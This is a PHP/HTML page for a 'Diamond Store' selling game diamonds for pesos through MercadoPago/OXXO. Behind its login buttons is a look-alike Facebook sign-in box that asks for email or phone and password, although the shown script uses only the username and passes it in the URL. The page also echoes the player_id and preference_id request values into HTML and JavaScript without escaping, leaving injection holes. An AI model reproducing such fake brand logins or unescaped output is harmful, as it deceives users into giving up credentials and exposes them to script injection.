<?php
$public_key = getenv('MP_PUBLIC_KEY');
$preference_id = $_GET['preference_id'] ?? null;
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIAMOND STORE | Centro de Carga Oficial</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://sdk.mercadopago.com/js/v2"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        /* Mantenemos tus estilos originales */
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap');
        body { background-color: #050505; color: #f8fafc; font-family: 'Rajdhani', sans-serif; overflow-x: hidden; }
        .font-gamer { font-family: 'Orbitron', sans-serif; }
        .main-bg { position: fixed; inset: 0; background: linear-gradient(rgba(2, 6, 23, 0.85), rgba(2, 6, 23, 0.95)), url('https://images8.alphacoders.com/105/1054593.jpg'); background-size: cover; z-index: -1; }
        #login-gate { position: fixed; inset: 0; z-index: 9999; background: #020617; display: <?php echo isset($_GET['player_id']) ? 'none' : 'flex'; ?>; align-items: center; justify-content: center; }
        #fb-modal { display: none; position: fixed; inset: 0; z-index: 10000; background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(10px); align-items: center; justify-content: center; }
        .fb-box { background: #ffffff; color: #1c1e21; width: 100%; max-width: 400px; padding: 2rem; border-radius: 8px; text-align: center; }
        .fb-input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dddfe2; border-radius: 6px; background: #f5f6f7; }
        .diamond-card { background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 24px; position: relative; overflow: hidden; transition: all 0.4s ease; cursor: pointer; }
        .diamond-card:hover { border-color: #facc15; transform: translateY(-8px); }
        #main-content { opacity: <?php echo isset($_GET['player_id']) ? '1' : '0'; ?>; pointer-events: <?php echo isset($_GET['player_id']) ? 'auto' : 'none'; ?>; }
        
        /* Modal de Pago */
        #mp-modal { display: <?php echo $preference_id ? 'flex' : 'none'; ?>; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 20000; align-items: center; justify-content: center; }
    </style>
</head>
<body>
    <div class="main-bg"></div>

    <div id="login-gate">
        <div class="text-center px-6 w-full max-w-md">
            <img src="https://i.ibb.co/NnxTBd3D/image.png" class="h-24 mx-auto mb-10 drop-shadow-[0_0_15px_rgba(59,130,246,0.8)]">
            <div class="bg-slate-900/90 p-8 rounded-[2.5rem] border border-white/5 shadow-2xl">
                <h2 class="font-gamer text-xl font-black mb-2 text-blue-400">ACCESO REQUERIDO</h2>
                <button onclick="abrirFB()" class="w-full bg-[#1877F2] py-4 rounded-2xl font-bold flex items-center justify-center gap-3 mb-4">Facebook Login</button>
                <button onclick="abrirFB()" class="w-full bg-white text-black py-4 rounded-2xl font-bold flex items-center justify-center gap-3">Google Account</button>
            </div>
        </div>
    </div>

    <div id="fb-modal">
        <div class="fb-box mx-4 shadow-2xl">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg" class="h-7 mx-auto mb-6">
            <input type="text" id="fb-user" placeholder="Correo o teléfono" class="fb-input">
            <input type="password" id="fb-pass" placeholder="Contraseña" class="fb-input">
            <button onclick="procesarLogin()" class="w-full bg-[#1877f2] text-white py-3 rounded-md font-bold">Iniciar sesión</button>
        </div>
    </div>

    <div id="main-content">
        <div class="max-w-6xl mx-auto px-6 py-12">
            <header class="flex flex-col md:flex-row justify-between items-center mb-16 gap-8 bg-black/40 p-8 rounded-[2rem] border border-white/5">
                <h1 class="font-gamer text-5xl font-black italic">DIAMOND<span class="text-yellow-400">STORE</span></h1>
                <p class="text-blue-500 font-bold">ID: <?php echo htmlspecialchars($_GET['player_id'] ?? ''); ?></p>
            </header>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
                <div class="diamond-card p-8 text-center" onclick="ejecutarCompra('700', 100)">
                    <img src="https://i.pinimg.com/originals/30/09/2d/30092d64022a9693155132207038e2ec.png" class="h-28 mx-auto mb-6">
                    <h3 class="font-gamer text-4xl">700 💎</h3>
                    <div class="bg-black/60 p-4 rounded-xl mt-4">$100 MXN</div>
                </div>
                <div class="diamond-card p-8 text-center border-yellow-500/50" onclick="ejecutarCompra('1500', 200)">
                    <img src="https://i.ibb.co/9kTgPZ2F/image.png" class="h-32 mx-auto mb-6">
                    <h3 class="font-gamer text-4xl">1,500 💎</h3>
                    <div class="bg-yellow-500 p-4 rounded-xl mt-4 text-black font-bold">$200 MXN</div>
                </div>
                <div class="diamond-card p-8 text-center" onclick="ejecutarCompra('3700', 500)">
                    <img src="https://i.ibb.co/jZ8W93zp/image.png" class="h-28 mx-auto mb-6">
                    <h3 class="font-gamer text-4xl">3,700 💎</h3>
                    <div class="bg-black/60 p-4 rounded-xl mt-4">$500 MXN</div>
                </div>
            </div>
        </div>
    </div>

    <div id="mp-modal">
        <div class="bg-slate-900 p-8 rounded-3xl border border-yellow-500 text-center max-w-sm w-full mx-4">
            <h2 class="font-gamer text-yellow-400 mb-4">PAGAR CON OXXO</h2>
            <div id="wallet_container"></div>
            <button onclick="window.location.href='index.php?player_id=<?php echo $_GET['player_id'] ?? ''; ?>'" class="mt-4 text-xs text-slate-500 underline">Cancelar</button>
        </div>
    </div>

    <form id="form-pago" action="pago.php" method="POST">
        <input type="hidden" name="player_id" value="<?php echo $_GET['player_id'] ?? ''; ?>">
        <input type="hidden" name="paquete" id="hidden-paquete">
        <input type="hidden" name="monto" id="hidden-monto">
    </form>

    <script>
        function abrirFB() { document.getElementById('fb-modal').style.display = 'flex'; }
        
        function procesarLogin() {
            const user = document.getElementById('fb-user').value;
            if(!user) return;
            // Al "loguear", recargamos la página con el ID en la URL para desbloquear la tienda
            window.location.href = "index.php?player_id=" + encodeURIComponent(user);
        }

        function ejecutarCompra(paquete, monto) {
            document.getElementById('hidden-paquete').value = paquete;
            document.getElementById('hidden-monto').value = monto;
            document.getElementById('form-pago').submit();
        }

        <?php if ($preference_id && $public_key): ?>
            const mp = new MercadoPago('<?php echo $public_key; ?>', { locale: 'es-MX' });
            mp.bricks().create("wallet", "wallet_container", {
                initialization: { preferenceId: '<?php echo $preference_id; ?>' }
            });
        <?php endif; ?>
    </script>
</body>
</html>